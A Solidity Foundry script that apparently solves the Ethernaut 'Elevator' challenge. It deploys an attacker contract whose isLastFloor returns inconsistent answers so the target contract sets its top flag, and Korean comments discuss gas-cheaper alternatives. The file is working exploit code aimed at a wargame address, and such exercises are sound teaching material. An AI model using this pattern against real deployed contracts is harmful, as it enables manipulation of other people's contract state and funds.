// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackElevator is Building {
    bool public change = false;

    function isLastFloor(uint256) external override returns (bool) {
        if (change == false) {
            change = true;
            return false;
        } else {
            return true;
        }
    }

    function attack(address _elevatorAddress) external {
        Elevator(_elevatorAddress).goTo(1);
    }
}

contract ElevatorSolution is Script {
    Elevator elevatorInstance = Elevator(payable(0x21dcB1439Db942a4a7bA190A9281341f15FB8Df4));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackElevator attacker = new AttackElevator(); // 배포
        attacker.attack(address(elevatorInstance)); // 공격
        vm.stopBroadcast();
    }
}
// forge script script/Elevator.s.sol:ElevatorSolution --broadcast -vvvv --slow
// cast call 0x392163B00B2Ee5345dB5908D429098fbFD021719 "top()(bool)"

// 이 풀이 방법은 상태변수를 바꿔서 푸는 방법이라 가스가 더 많이 사용됨. 그래서 view()함수 방식으로 읽기만 해서 푸는 방식이 가스를 적게 먹는 방법임 gasleft() 함수를 통해서도 풀이 가능